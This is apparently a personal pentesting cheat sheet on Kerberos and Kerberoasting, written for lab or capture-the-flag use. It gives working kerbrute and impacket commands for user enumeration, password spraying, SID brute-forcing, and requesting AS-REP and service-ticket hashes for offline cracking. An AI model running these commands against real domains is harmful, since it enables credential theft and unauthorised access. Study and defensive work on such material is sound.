# Kerberoas

---
# Navigation
- **[[#Definition]]**
- **[[#Kerberoasting]]**
	- [[#Kerbrute]]
	- [[#Kerberoasting]] 
- **[[#Synchronizing time is important]]**
- **[[#Further reading]]**

---
# Definition
## What's Kerberoas
Kerberos is **an authentication protocol that works on the basis of tickets** that allows clients to connect to services over an insecure network and still allow clients to prove their identity in a secure manner.
## How does Kerberoas work?
1. Login.
2. Request for Ticket Granting Ticket – TGT, Client to Server.
3. Server checks if the user exists.
4. Server sends TGT back to the client.
5. Enter your password.
6. Client obtains the TGS Session Key.
7. Client requests server to access a service.
8. Server verifies if service exist.
9. Server verifies request.
10. Server generates service session key.
11. Client receives service session key.
12. Client contacts service.
13. Service receives the request.
14. Service verifies request.
15. Service confirms identity to the client.
16. Client receives confirmation.
17. Client communicates with the service.
> Detailed explaination here: https://www.vanimpe.eu/2017/05/26/kerberos-made-easy/

# Kerberoasting
The goal is to get a **TGS** and decrypt server's account hash.
> Pre-requesties: Have a username or a list of users.

## Kerbrute
 For user enumeration,Password spraying and more
 ```bash
 go get github.com/ropnop/kerbrute
```
## Impacket tools
 **impacket-GetNPUsers**: Get users with disabled `Pre-authentication`.
 ```bash
 impacket-GetNPUsers <DOMAIN>/ -dc-ip 10.10.10.240 -no-pass -usersfile usernames.txt -format john
 ```
  **impacket-lookupsid**: Performs bruteforcing of Windows SID’s to identify users/groups on the remote target.
  ```bash
  impacket-lookupsid <DOAMIN>/ -target-ip <IP>
  ```
  **impacket-GetUserSPNs**:  Find Service Principal Names that are associated with a normal user account.
 ```bash
 impacket-GetUserSPNs <DOMAIN>/<USER> -dc-ip <IP> -request
 impacket-GetUserSPNs  <DOMAIN>/<USER> -dc-ip 10.10.10.240 -usersfile usernames.txt -no-pass -request
 ```
  **impacket-GetADUsers**: Gather data about the domain’s users and their corresponding email addresses. It will also include some extra information about last logon and last password set attributes.*If no entries are returned that means users don’t have email addresses specified so you can use **-all** option*.
 ```bash
 impacket-GetADUsers <DOMAIN>/<USER> -dc-ip <IP>
 impacket-GetADUsers <DOMAIN>/<USER> -dc-ip <IP> -all
 ```
 # Synchronizing time is important
```bash
#Disable time sync on VM
sudo apt install ntpdate
sudo ntpdate <RemoteMachine-IP>

#Second method
sudo apt install rdate
sudo rdate -n <DC>

#IF the above didn't work
sudo apt-get install chrony
sudo timedatectl set-ntp true 
sudo ntpdate <machine IP>
```
 # Further reading
 -  Explained -> [**Uncontrained/Constrained Delegation**](http://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html)
 - Tutorial -> [**Impacket-Tools**](https://www.hackingarticles.in/abusing-kerberos-using-impacket/)
- Cheatsheet -> [**Kerbrute CheatSheet**](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a)

